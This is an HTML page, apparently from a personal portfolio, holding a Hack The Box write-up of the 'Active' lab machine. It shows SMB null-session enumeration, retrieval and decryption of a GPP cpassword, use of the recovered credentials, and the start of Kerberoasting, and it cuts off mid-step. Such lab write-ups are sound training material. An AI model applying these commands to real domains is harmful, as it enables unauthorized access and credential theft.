@@ -1,0 +1,1212 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Active (Easy) — HTB Writeup | PLSCARRYME</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --accent: #ff6b7a;
+            --accent-dark: #dc3545;
+            --accent-glow: rgba(220, 53, 69, 0.35);
+            --accent-subtle: rgba(220, 53, 69, 0.12);
+            --bg: #0a0d12;
+            --bg2: #0f1318;
+            --surface: rgba(255, 255, 255, 0.04);
+            --surface2: rgba(255, 255, 255, 0.07);
+            --text: #d4dbe8;
+            --muted: #7a8799;
+            --border: rgba(220, 53, 69, 0.18);
+            --red: #ff6b7a;
+            --red-subtle: rgba(220, 53, 69, 0.12);
+            --red-glow: rgba(220, 53, 69, 0.3);
+            --green: #5acd7a;
+            --green-subtle: rgba(40, 167, 69, 0.1);
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.7;
+            min-height: 100vh;
+        }
+
+        /* ── NAV ── */
+        header {
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(12px);
+            border-bottom: 2px solid var(--accent-dark);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        nav {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 1rem 1.5rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 1.4rem;
+            font-weight: bold;
+            color: #dc3545;
+            text-decoration: none;
+        }
+
+        .back-btn {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: var(--accent);
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 0.95rem;
+            padding: 0.5rem 1rem;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            transition: all 0.3s;
+        }
+
+        .back-btn:hover {
+            background: var(--accent-subtle);
+            box-shadow: 0 0 15px var(--accent-glow);
+        }
+
+        /* ── HERO ── */
+        .writeup-hero {
+            background: linear-gradient(135deg, #0a0d12 0%, #120d0d 50%, #0f0a0a 100%);
+            border-bottom: 1px solid rgba(220, 53, 69, 0.2);
+            padding: 3.5rem 1.5rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .writeup-hero::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -20%;
+            width: 600px;
+            height: 600px;
+            background: radial-gradient(circle, rgba(220, 53, 69, 0.05) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        .writeup-hero::after {
+            content: '';
+            position: absolute;
+            bottom: -30%;
+            right: -10%;
+            width: 400px;
+            height: 400px;
+            background: radial-gradient(circle, rgba(220, 53, 69, 0.04) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        .hero-inner {
+            max-width: 1100px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+        }
+
+        .hero-badges {
+            display: flex;
+            gap: 0.75rem;
+            flex-wrap: wrap;
+            margin-bottom: 1.5rem;
+        }
+
+        .badge {
+            padding: 0.3rem 0.8rem;
+            border-radius: 20px;
+            font-size: 0.78rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .badge.red {
+            background: rgba(220, 53, 69, 0.8);
+            color: #fff;
+        }
+
+        .badge.outline {
+            border: 1px solid var(--border);
+            color: var(--muted);
+            background: transparent;
+        }
+
+        .writeup-hero h1 {
+            font-size: clamp(1.8rem, 4vw, 2.8rem);
+            color: var(--red);
+            margin-bottom: 1rem;
+            font-weight: 700;
+            line-height: 1.2;
+            text-shadow: 0 0 40px rgba(220, 53, 69, 0.3);
+        }
+
+        .writeup-hero p.subtitle {
+            font-size: 1.05rem;
+            color: var(--muted);
+            max-width: 700px;
+            margin-bottom: 2rem;
+        }
+
+        .hero-meta {
+            display: flex;
+            gap: 2rem;
+            flex-wrap: wrap;
+        }
+
+        .hero-meta span {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            font-size: 0.9rem;
+            color: var(--muted);
+        }
+
+        .hero-meta i {
+            color: var(--red);
+        }
+
+        /* ── LAYOUT ── */
+        .content-wrap {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 3rem 1.5rem;
+            display: grid;
+            grid-template-columns: 1fr 280px;
+            gap: 3rem;
+            align-items: start;
+        }
+
+        @media (max-width: 900px) {
+            .content-wrap {
+                grid-template-columns: 1fr;
+            }
+
+            .sidebar {
+                order: -1;
+            }
+        }
+
+        /* ── SIDEBAR ── */
+        .sidebar {
+            position: sticky;
+            top: 90px;
+        }
+
+        .sidebar-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .sidebar-card h4 {
+            color: var(--accent);
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            margin-bottom: 1rem;
+        }
+
+        .toc-list {
+            list-style: none;
+        }
+
+        .toc-list li {
+            border-left: 2px solid var(--border);
+            padding: 0.4rem 0 0.4rem 0.9rem;
+            margin-bottom: 0.2rem;
+            transition: border-color 0.2s;
+        }
+
+        .toc-list li:hover {
+            border-color: var(--accent);
+        }
+
+        .toc-list a {
+            color: var(--muted);
+            text-decoration: none;
+            font-size: 0.88rem;
+            transition: color 0.2s;
+        }
+
+        .toc-list a:hover {
+            color: var(--accent);
+        }
+
+        .skill-pill {
+            display: inline-block;
+            background: var(--accent-subtle);
+            color: var(--accent);
+            border: 1px solid var(--border);
+            padding: 0.25rem 0.6rem;
+            border-radius: 20px;
+            font-size: 0.78rem;
+            margin: 0.2rem;
+        }
+
+        .skill-pill.red {
+            background: var(--red-subtle);
+            color: var(--red);
+            border-color: rgba(220, 53, 69, 0.25);
+        }
+
+        /* ── MAIN CONTENT ── */
+        .section-block {
+            margin-bottom: 3.5rem;
+        }
+
+        .section-block h2 {
+            font-size: 1.6rem;
+            color: var(--accent);
+            margin-bottom: 1.2rem;
+            padding-bottom: 0.6rem;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+        }
+
+        .section-block h3 {
+            font-size: 1.15rem;
+            color: #ffb3bb;
+            margin: 1.8rem 0 0.8rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .section-block p {
+            color: var(--text);
+            margin-bottom: 1rem;
+        }
+
+        /* ── SCENARIO BOX ── */
+        .scenario-box {
+            background: linear-gradient(135deg, rgba(220, 53, 69, 0.06), rgba(220, 53, 69, 0.04));
+            border: 1px solid rgba(220, 53, 69, 0.25);
+            border-radius: 14px;
+            padding: 2rem;
+            margin: 1.5rem 0;
+        }
+
+        .scenario-box h3 {
+            color: var(--red);
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+        }
+
+        .scenario-box p {
+            font-size: 0.95rem;
+            color: var(--text);
+            margin: 0;
+        }
+
+        /* ── CODE BLOCKS ── */
+        .code-block {
+            background: #0d1117;
+            border: 1px solid rgba(220, 53, 69, 0.2);
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 1rem 0;
+        }
+
+        .code-block .code-bar {
+            background: rgba(220, 53, 69, 0.1);
+            border-bottom: 1px solid rgba(220, 53, 69, 0.15);
+            padding: 0.45rem 1rem;
+            font-size: 0.78rem;
+            color: var(--muted);
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+
+        .code-block pre {
+            padding: 1.2rem 1.3rem;
+            font-size: 0.83rem;
+            line-height: 1.75;
+            overflow-x: auto;
+            margin: 0;
+            color: #ffd0d5;
+            font-family: 'Courier New', Consolas, monospace;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .code-block pre .c-cmd {
+            color: #ff9eaa;
+        }
+
+        .code-block pre .c-flag {
+            color: #ffa657;
+        }
+
+        .code-block pre .c-val {
+            color: #a5d6a7;
+        }
+
+        .code-block pre .c-url {
+            color: #ffcfa5;
+        }
+
+        .code-block pre .c-highlight {
+            color: #ff7b72;
+        }
+
+        /* ── FINDING CARDS ── */
+        .finding-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+
+        .finding-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 1.2rem;
+            transition: all 0.3s;
+        }
+
+        .finding-card:hover {
+            border-color: var(--red);
+            background: var(--surface2);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 20px var(--red-glow);
+        }
+
+        .finding-card .fc-icon {
+            font-size: 1.4rem;
+            color: var(--red);
+            margin-bottom: 0.6rem;
+            display: block;
+        }
+
+        .finding-card h4 {
+            color: #ffd0d5;
+            font-size: 0.95rem;
+            margin-bottom: 0.4rem;
+        }
+
+        .finding-card p {
+            font-size: 0.85rem;
+            color: var(--muted);
+            margin: 0;
+        }
+
+        /* ── ATTACK CHAIN STEPS ── */
+        .attack-steps {
+            margin: 1.5rem 0;
+            position: relative;
+        }
+
+        .attack-steps::before {
+            content: '';
+            position: absolute;
+            left: 22px;
+            top: 28px;
+            bottom: 28px;
+            width: 2px;
+            background: linear-gradient(to bottom, rgba(220, 53, 69, 0.8), transparent);
+        }
+
+        .step {
+            display: flex;
+            gap: 1.2rem;
+            margin-bottom: 1.2rem;
+            position: relative;
+        }
+
+        .step-num {
+            width: 44px;
+            height: 44px;
+            min-width: 44px;
+            background: rgba(220, 53, 69, 0.8);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 0.9rem;
+            color: #fff;
+            box-shadow: 0 0 20px var(--red-glow);
+            position: relative;
+            z-index: 1;
+        }
+
+        .step-body {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 1rem 1.2rem;
+            flex: 1;
+            transition: all 0.3s;
+        }
+
+        .step-body:hover {
+            background: var(--surface2);
+            border-color: rgba(220, 53, 69, 0.4);
+        }
+
+        .step-body h4 {
+            color: #ffd0d5;
+            font-size: 0.95rem;
+            margin-bottom: 0.3rem;
+        }
+
+        .step-body p {
+            font-size: 0.85rem;
+            color: var(--muted);
+            margin: 0;
+        }
+
+        /* ── BYPASS ANATOMY ── */
+        .bypass-box {
+            background: linear-gradient(135deg, rgba(255, 140, 50, 0.07), rgba(220, 53, 69, 0.04));
+            border: 1px solid rgba(255, 140, 50, 0.35);
+            border-radius: 14px;
+            padding: 2rem;
+            margin: 1.5rem 0;
+        }
+
+        .bypass-box h3 {
+            color: #ff9d57;
+            margin-bottom: 1.2rem;
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+        }
+
+        /* ── FLAG BOX ── */
+        .flag-box {
+            background: linear-gradient(135deg, rgba(40, 167, 69, 0.08), rgba(220, 53, 69, 0.06));
+            border: 1px solid rgba(90, 205, 122, 0.3);
+            border-radius: 14px;
+            padding: 2rem;
+            margin: 1.5rem 0;
+            text-align: center;
+        }
+
+        .flag-box .flag-icon {
+            font-size: 2.5rem;
+            color: var(--green);
+            margin-bottom: 0.8rem;
+        }
+
+        .flag-box h3 {
+            color: var(--green);
+            font-size: 1.3rem;
+            margin-bottom: 0.6rem;
+        }
+
+        .flag-box .flag-file {
+            font-family: 'Courier New', monospace;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(90, 205, 122, 0.25);
+            border-radius: 8px;
+            padding: 0.8rem 1.5rem;
+            display: inline-block;
+            color: var(--green);
+            font-size: 1rem;
+            margin-top: 0.5rem;
+        }
+
+        /* ── CRED BOX ── */
+        .cred-box {
+            background: linear-gradient(135deg, rgba(255, 140, 50, 0.07), rgba(220, 53, 69, 0.04));
+            border: 1px solid rgba(255, 140, 50, 0.35);
+            border-radius: 14px;
+            padding: 1.5rem 2rem;
+            margin: 1.5rem 0;
+        }
+
+        .cred-box h3 {
+            color: #ff9d57;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+            font-size: 1rem;
+        }
+
+        .cred-row {
+            display: flex;
+            gap: 1rem;
+            padding: 0.3rem 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.88rem;
+        }
+
+        .cred-label {
+            color: var(--muted);
+            min-width: 90px;
+        }
+
+        .cred-value {
+            color: var(--green);
+            font-weight: 600;
+        }
+
+        /* ── TAKEAWAYS ── */
+        .takeaway-box {
+            background: linear-gradient(135deg, rgba(40, 167, 69, 0.06), rgba(220, 53, 69, 0.06));
+            border: 1px solid rgba(90, 205, 122, 0.2);
+            border-radius: 12px;
+            padding: 1.8rem;
+            margin-top: 2rem;
+        }
+
+        .takeaway-box h3 {
+            color: #5acd7a;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .takeaway-box ul {
+            list-style: none;
+        }
+
+        .takeaway-box li {
+            padding: 0.4rem 0;
+            padding-left: 1.2rem;
+            position: relative;
+            color: var(--text);
+            font-size: 0.93rem;
+        }
+
+        .takeaway-box li::before {
+            content: '→';
+            position: absolute;
+            left: 0;
+            color: #5acd7a;
+        }
+
+        /* ── VULN LABEL ── */
+        .vuln-label {
+            display: inline-block;
+            font-weight: 700;
+            padding: 0.2rem 0.6rem;
+            border-radius: 6px;
+            font-size: 0.82rem;
+            white-space: nowrap;
+        }
+
+        .vuln-smb {
+            background: rgba(220, 53, 69, 0.2);
+            color: #ff6b7a;
+            border: 1px solid rgba(220, 53, 69, 0.3);
+        }
+
+        .vuln-gpp {
+            background: rgba(255, 193, 7, 0.15);
+            color: #ffc107;
+            border: 1px solid rgba(255, 193, 7, 0.3);
+        }
+
+        .vuln-kerb {
+            background: rgba(155, 89, 182, 0.2);
+            color: #c39bd3;
+            border: 1px solid rgba(155, 89, 182, 0.3);
+        }
+
+        .vuln-rce {
+            background: rgba(255, 100, 0, 0.2);
+            color: #ff8c42;
+            border: 1px solid rgba(255, 100, 0, 0.3);
+        }
+
+        /* ── INLINE CODE ── */
+        code {
+            background: rgba(220, 53, 69, 0.12);
+            color: var(--accent);
+            padding: 0.1rem 0.4rem;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.88em;
+        }
+
+        /* ── NOTE CALLOUT ── */
+        .callout {
+            display: flex;
+            gap: 0.8rem;
+            align-items: flex-start;
+            background: rgba(220, 53, 69, 0.06);
+            border-left: 3px solid var(--accent-dark);
+            border-radius: 0 8px 8px 0;
+            padding: 0.9rem 1.1rem;
+            margin: 1rem 0;
+            font-size: 0.9rem;
+            color: var(--muted);
+        }
+
+        .callout i {
+            color: var(--accent);
+            margin-top: 0.15rem;
+            min-width: 14px;
+        }
+
+        .callout.warn {
+            border-left-color: #ffc107;
+            background: rgba(255, 193, 7, 0.05);
+        }
+
+        .callout.warn i {
+            color: #ffc107;
+        }
+
+        .callout.success {
+            border-left-color: #5acd7a;
+            background: rgba(40, 167, 69, 0.05);
+        }
+
+        .callout.success i {
+            color: #5acd7a;
+        }
+
+        /* ── SCREENSHOT IMAGES ── */
+        .img-frame {
+            margin: 1.2rem 0;
+            border-radius: 10px;
+            overflow: hidden;
+            border: 1px solid rgba(220, 53, 69, 0.2);
+            background: #0d1117;
+        }
+
+        .img-frame .img-bar {
+            background: rgba(220, 53, 69, 0.1);
+            border-bottom: 1px solid rgba(220, 53, 69, 0.15);
+            padding: 0.4rem 1rem;
+            font-size: 0.75rem;
+            color: var(--muted);
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+
+        .img-frame img {
+            display: block;
+            width: 100%;
+            height: auto;
+        }
+
+        /* ── FOOTER ── */
+        footer {
+            background: rgba(0, 0, 0, 0.8);
+            border-top: 1px solid var(--border);
+            text-align: center;
+            padding: 2rem 1.5rem;
+            color: var(--muted);
+            font-size: 0.9rem;
+        }
+
+        footer a {
+            color: var(--accent);
+            text-decoration: none;
+        }
+
+        /* Scroll progress */
+        #progress {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #dc3545, #ff6b7a);
+            z-index: 9999;
+            width: 0%;
+            transition: width 0.1s;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div id="progress"></div>
+
+    <header>
+        <nav>
+            <a href="../index.html" class="logo"><i class="fas fa-terminal"></i> ANDY - Cybersecurity Portfolio</a>
+            <a href="../index.html" class="back-btn"><i class="fas fa-arrow-left"></i> Back to Portfolio</a>
+        </nav>
+    </header>
+
+    <!-- Hero -->
+    <div class="writeup-hero">
+        <div class="hero-inner">
+            <div class="hero-badges">
+                <span class="badge red"><i class="fas fa-skull-crossbones"></i> &nbsp;Red Team</span>
+                <span class="badge outline">Easy</span>
+                <span class="badge outline">Active Directory</span>
+            </div>
+            <h1>Active — HTB Writeup</h1>
+            <p class="subtitle">
+                A classic Active Directory attack chain: anonymous SMB enumeration exposes a GPP credentials file,
+                decrypted cPassword provides domain user access, and Kerberoasting the Administrator SPN yields
+                a SYSTEM shell via PsExec.
+            </p>
+            <div class="hero-meta">
+                <span><i class="fas fa-crosshairs"></i> Offensive / Active Directory</span>
+                <span><i class="fas fa-list-check"></i> 5 Phases</span>
+                <span><i class="fas fa-tag"></i> SMB · GPP · Kerberoasting · PsExec</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main layout -->
+    <div class="content-wrap">
+
+        <!-- Article -->
+        <article>
+
+            <!-- 1. Setup & Scenario -->
+            <div class="section-block" id="s1">
+                <h2><i class="fas fa-cog"></i> 1. Setup</h2>
+                <p>Add the target to your hosts file before starting:</p>
+
+                <div class="code-block">
+                    <div class="code-bar"><i class="fas fa-terminal"></i> /etc/hosts configuration</div>
+                    <pre><span class="c-cmd">echo</span> <span class="c-val">"[target ip] active.htb"</span> | <span class="c-cmd">sudo</span> tee -a /etc/hosts</pre>
+                </div>
+
+                <div class="scenario-box">
+                    <h3><i class="fas fa-server"></i> Target Overview</h3>
+                    <p>
+                        <strong style="color: var(--accent);">Machine:</strong> Active (Hack The Box)<br>
+                        <strong style="color: var(--accent);">OS:</strong> Windows Server 2008 R2 SP1<br>
+                        <strong style="color: var(--accent);">Role:</strong> Active Directory Domain Controller<br>
+                        <strong style="color: var(--accent);">Domain:</strong> active.htb<br>
+                        <strong style="color: var(--accent);">Difficulty:</strong> Easy
+                    </p>
+                </div>
+
+                <p>The attack chain ultimately exploits two vulnerabilities:</p>
+
+                <div class="finding-grid">
+                    <div class="finding-card">
+                        <span class="fc-icon"><i class="fas fa-folder-open"></i></span>
+                        <h4><span class="vuln-label vuln-smb">SMB</span> Anonymous Access</h4>
+                        <p>The <code>Replication</code> share allows anonymous read access, exposing SYSVOL-like Group Policy data including GPP credentials.</p>
+                    </div>
+                    <div class="finding-card">
+                        <span class="fc-icon"><i class="fas fa-key"></i></span>
+                        <h4><span class="vuln-label vuln-gpp">GPP</span> cPassword Exposure</h4>
+                        <p><code>Groups.xml</code> contains an AES-encrypted password — trivially decryptable since Microsoft published the key (MS14-025).</p>
+                    </div>
+                    <div class="finding-card">
+                        <span class="fc-icon"><i class="fas fa-ticket-alt"></i></span>
+                        <h4><span class="vuln-label vuln-kerb">Kerberoasting</span></h4>
+                        <p>The <code>SVC_TGS</code> service account allows any authenticated user to request a TGS ticket for the Administrator, crackable offline.</p>
+                    </div>
+                    <div class="finding-card">
+                        <span class="fc-icon"><i class="fas fa-terminal"></i></span>
+                        <h4><span class="vuln-label vuln-rce">SYSTEM</span> via PsExec</h4>
+                        <p>Cracked Administrator credentials allow a full SYSTEM shell via <code>impacket-psexec</code>.</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 2. Enumeration -->
+            <div class="section-block" id="s2">
+                <h2><i class="fas fa-search"></i> 2. Enumeration</h2>
+
+                <h3><i class="fas fa-radar"></i> Nmap Full Scan</h3>
+                <p>
+                    A full port scan reveals this is an Active Directory Domain Controller with all the
+                    hallmark services: Kerberos (88), LDAP (389/3268), DNS (53), and SMB (445).
+                </p>
+
+                <div class="code-block">
+                    <div class="code-bar"><i class="fas fa-terminal"></i> nmap — full TCP scan with service detection</div>
+                    <pre><span class="c-cmd">sudo nmap</span> <span class="c-flag">-A</span> [TARGET IP] <span class="c-flag">-p-</span></pre>
+                </div>
+
+                <div class="img-frame">
+                    <div class="img-bar"><i class="fas fa-image"></i> Nmap scan results</div>
+                    <img src="image.png" alt="Nmap full port scan results showing AD Domain Controller services" loading="lazy">
+                </div>
+
+                <div class="callout">
+                    <i class="fas fa-info-circle"></i>
+                    <span>Key indicators of an AD Domain Controller: <code>445/tcp open microsoft-ds</code> (SMB),
+                        <code>88/tcp open kerberos-sec</code>, <code>389/tcp open ldap</code> with
+                        <code>Domain: active.htb</code>, and hostname <code>DC</code>.</span>
+                </div>
+
+                <h3><i class="fas fa-share-alt"></i> SMB Share Enumeration</h3>
+                <p>
+                    Using enum4linux to leverage an SMB null session and LDAP anonymous bind, we enumerate
+                    available shares:
+                </p>
+
+                <div class="code-block">
+                    <div class="code-bar"><i class="fas fa-terminal"></i> enum4linux — null session share enumeration</div>
+                    <pre><span class="c-cmd">enum4linux</span> <span class="c-flag">-a -u</span> <span class="c-val">""</span> <span class="c-flag">-p</span> <span class="c-val">""</span> [TARGET IP]</pre>
+                </div>
+
+                <div class="img-frame">
+                    <div class="img-bar"><i class="fas fa-image"></i> enum4linux — share enumeration &amp; mapping results</div>
+                    <img src="image 1.png" alt="enum4linux share enumeration showing Replication share with anonymous access" loading="lazy">
+                </div>
+
+                <p>
+                    There are 7 SMB shares. The only share that allows anonymous read access is
+                    <code>Replication</code> — with both Mapping: OK and Listing: OK. All administrative
+                    shares (<code>ADMIN$</code>, <code>C$</code>, <code>NETLOGON</code>, <code>SYSVOL</code>)
+                    are denied.
+                </p>
+
+                <div class="callout success">
+                    <i class="fas fa-check-circle"></i>
+                    <span>The <code>Replication</code> share mirrors SYSVOL-like content — Group Policy data
+                        that often contains sensitive configuration files including GPP password entries.</span>
+                </div>
+            </div>
+
+            <!-- 3. GPP Credential Abuse -->
+            <div class="section-block" id="s3">
+                <h2><i class="fas fa-key"></i> 3. GPP Credential Abuse</h2>
+                <p>
+                    Browsing the Replication share, I found <code>Groups.xml</code> buried in the Group Policy
+                    Preferences directory:
+                </p>
+
+                <div class="code-block">
+                    <div class="code-bar"><i class="fas fa-folder-tree"></i> File location in Replication share</div>
+                    <pre><span class="c-url">\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups</span></pre>
+                </div>
+
+                <h3><i class="fas fa-download"></i> Downloading Groups.xml</h3>
+                <p>
+                    To download the file, we connect with smbclient and use recursive search:
+                </p>
+
+                <div class="code-block">
+                    <div class="code-bar"><i class="fas fa-terminal"></i> smbclient — downloading Groups.xml</div>
+                    <pre><span class="c-cmd">smbclient</span> <span class="c-url">//[TARGET IP]/Replication</span> <span class="c-flag">-N</span>
+
+<span class="c-val">smb: \></span> <span class="c-cmd">recurse ON</span>      <span class="c-val"># search all subdirectories</span>
+<span class="c-val">smb: \></span> <span class="c-cmd">prompt OFF</span>      <span class="c-val"># skip y/n confirmation for each file</span>
+<span class="c-val">smb: \></span> <span class="c-cmd">mget</span> Groups.xml <span class="c-val"># download matching files recursively</span>
+
+<span class="c-val"># OR if you already know the full path:</span>
+<span class="c-val">smb: \></span> <span class="c-cmd">get</span> <span class="c-url">active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml</span></pre>
+                </div>
+
+                <div class="img-frame">
+                    <div class="img-bar"><i class="fas fa-image"></i> Groups.xml download via smbclient</div>
+                    <img src="image 2.png" alt="smbclient downloading Groups.xml from Replication share" loading="lazy">
+                </div>
+
+                <h3><i class="fas fa-file-code"></i> Groups.xml Content</h3>
+                <p>
+                    The XML file contains a GPP entry for the <code>SVC_TGS</code> service account with an
+                    encrypted <code>cpassword</code> field:
+                </p>
+
+                <div class="code-block">
+                    <div class="code-bar"><i class="fas fa-file-code"></i> Groups.xml — GPP credential data</div>
+                    <pre><span class="c-highlight">&lt;User</span> name=<span class="c-val">"active.htb\SVC_TGS"</span>
+      changed=<span class="c-val">"2018-07-18 20:46:06"</span><span class="c-highlight">&gt;</span>
+  <span class="c-highlight">&lt;Properties</span>
+      cpassword=<span class="c-url">"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOs
+                 QbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</span>
+      userName=<span class="c-val">"active.htb\SVC_TGS"</span>
+      neverExpires=<span class="c-val">"1"</span> <span class="c-highlight">/&gt;</span></pre>
+                </div>
+
+                <div class="bypass-box">
+                    <h3><i class="fas fa-unlock-alt"></i> GPP / MS14-025 — The Published AES Key</h3>
+                    <p style="color: var(--muted); font-size: 0.93rem; margin-bottom: 1rem;">
+                        Group Policy Preferences (GPP) allowed administrators to set local passwords via Group Policy.
+                        Microsoft encrypted these with AES-256, but then <strong>published the private key</strong>
+                        in their MSDN documentation — making decryption trivial for anyone. This was patched in
+                        MS14-025, but existing <code>Groups.xml</code> files remain on SYSVOL shares.
+                    </p>
+                </div>
+
+                <h3><i class="fas fa-lock-open"></i> Decrypting the cPassword</h3>
+                <div class="code-block">
+                    <div class="code-bar"><i class="fas fa-terminal"></i> gpp-decrypt — decrypting the AES cPassword</div>
+                    <pre><span class="c-cmd">gpp-decrypt</span> <span class="c-url">"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</span>
+
+<span class="c-val">GPPstillStandingStrong2k18</span></pre>
+                </div>
+
+                <div class="cred-box">
+                    <h3><i class="fas fa-user-secret"></i> Credentials Obtained</h3>
+                    <div class="cred-row">
+                        <span class="cred-label">User</span>
+                        <span class="cred-value">active.htb\SVC_TGS</span>
+                    </div>
+                    <div class="cred-row">
+                        <span class="cred-label">Password</span>
+                        <span class="cred-value">GPPstillStandingStrong2k18</span>
+                    </div>
+                </div>
+
+                <h3><i class="fas fa-check-double"></i> Verifying Credentials</h3>
+                <div class="code-block">
+                    <div class="code-bar"><i class="fas fa-terminal"></i> smbmap — testing authenticated access</div>
+                    <pre><span class="c-cmd">smbmap</span> <span class="c-flag">-H</span> [TARGET IP] <span class="c-flag">-d</span> <span class="c-val">active.htb</span> <span class="c-flag">-u</span> <span class="c-val">SVC_TGS</span> <span class="c-flag">-p</span> <span class="c-val">GPPstillStandingStrong2k18</span></pre>
+                </div>
+
+                <div class="img-frame">
+                    <div class="img-bar"><i class="fas fa-image"></i> smbmap — authenticated share permissions</div>
+                    <img src="image 3.png" alt="smbmap showing READ access to NETLOGON, SYSVOL, Users with SVC_TGS credentials" loading="lazy">
+                </div>
+
+                <div class="callout success">
+                    <i class="fas fa-check-circle"></i>
+                    <span>Credentials work! We now have READ access to <code>NETLOGON</code>, <code>SYSVOL</code>,
+                        and <code>Users</code> shares — previously denied with anonymous access.</span>
+                </div>
+            </div>
+
+            <!-- 4. Foothold & User Flag -->
+            <div class="section-block" id="s4">
+                <h2><i class="fas fa-flag"></i> 4. Foothold & User Flag</h2>
+                <p>
+                    Connect to the Users share with the SVC_TGS credentials and enumerate for the user flag:
+                </p>
+
+                <div class="code-block">
+                    <div class="code-bar"><i class="fas fa-terminal"></i> smbclient — accessing Users share</div>
+                    <pre><span class="c-cmd">smbclient</span> <span class="c-url">//[TARGET IP]/Users</span> <span class="c-flag">-U</span> <span class="c-val">'active.htb\SVC_TGS%GPPstillStandingStrong2k18'</span></pre>
+                </div>
+
+                <p>
+                    After enumerating the share, I found the user flag at <code>SVC_TGS\Desktop\user.txt</code>.
+                </p>
+
+                <div class="flag-box">
+                    <div class="flag-icon"><i class="fas fa-flag"></i></div>
+                    <h3>User Flag</h3>
+                    <p style="color: var(--muted); font-size: 0.9rem; margin-bottom: 0.5rem;">
+                        Located at <code>SVC_TGS\Desktop\user.txt</code>
+                    </p>
+                    <div class="flag-file">user.txt ✓</div>
+                </div>
+            </div>
+
+            <!-- 5. Kerberoasting -->
+            <div class="section-block" id="s5">
+                <h2><i class="fas fa-ticket-alt"></i> 5. Privilege Escalation — Kerberoasting</h2>
+                <p>
+                    The account name <code>SVC_TGS</code> is a strong hint — it's a service account likely
+                    with a Service Principal Name (SPN) registered. In an Active Directory environment, any
+                    authenticated user can request TGS tickets for accounts with SPNs and crack them offline.
+                    This is <strong style="color: var(--accent);">Kerberoasting</strong>.
+                </p>
+
+                <div class="callout">
+                    <i class="fas fa-info-circle"></i>
+                    <span>Kerberoasting exploits the fact that any authenticated domain user can request a TGS
+                        ticket for any service account. The ticket is encrypted with the service account's NTLM
+                        hash — if the password is weak, it can be cracked offline without triggering account
+                        lockout policies.</span>
+                </div>
+
+                <div class="attack-steps">
+                    <div class="step">
+                        <div class="step-num">1</div>
+                        <div class="step-body">
+                            <h4>Request TGS Tickets</h4>
+                            <p>Use <code>impacket-GetUserSPNs</code> with the SVC_TGS credentials to request
+                                Kerberos service tickets for any Kerberoastable accounts in the domain.</p>
+                        </div>
+                    </div>
+
+                    <div class="code-block" style="margin: 0 0 1.2rem 3.8rem;">
+                        <div class="code-bar"><i class="fas fa-terminal"></i> impacket — Kerberoasting the domain</div>
